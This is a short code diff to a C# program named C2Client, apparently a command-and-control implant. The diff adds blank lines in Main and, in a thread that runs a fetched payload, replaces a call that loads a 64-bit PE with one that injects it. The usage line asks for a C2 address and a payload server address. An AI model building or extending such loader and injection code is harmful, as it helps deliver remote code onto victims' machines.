@@ -994,6 +994,10 @@ namespace C2Client
 
         public static void Main(string[] args)
         {
+
+            
+
+
             if (args.Length != 4)
             {
                 Console.WriteLine("Usage: exe IP PORT PAYLOAD_SERVER_IP PORT");
@@ -1438,7 +1442,7 @@ namespace C2Client
                         {
                             Thread pe64loader = new Thread(() =>
                             {
-                                winapi.LoadPE64(payload);
+                                winapi.InjectPE64(payload);
                             });
                             pe64loader.Start();
                             
